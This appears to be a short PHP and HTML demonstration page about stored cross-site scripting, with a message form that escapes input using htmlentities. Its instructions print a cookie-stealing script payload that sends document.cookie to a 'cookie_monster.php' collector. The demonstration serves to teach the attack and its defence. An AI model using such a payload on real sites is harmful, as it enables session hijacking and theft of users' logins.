<form action="" method="get">
	<p>To TRY and execute the XSS attack, please paste</p>
	<pre>&lt;script&gt;document.location = 'cookie_monster.php?cookies=' + document.cookie&lt;/script&gt;</pre>
	<input type="text" name="message"><br />
	<input type="submit" value ="Post" />
</form>
<script>
	document.cookie = 'ppkcookie1=testcookie; expires=Thu, 25 Aug 2012 20:47:11 UTC; path=/'
</script>
<?php
	if(!empty($_GET['message'])){
		/**
		* Assign to a variable then validate.
		*/
		$message = htmlentities($_GET['message']);
		
		$fp = fopen('./messages.txt', 'a'); // Opens the file
		fwrite($fp, "$message<br />"); // Writes in the file
		fclose($fp); // Close the file
	}
	readfile('./messages.txt'); // Print the output
?>
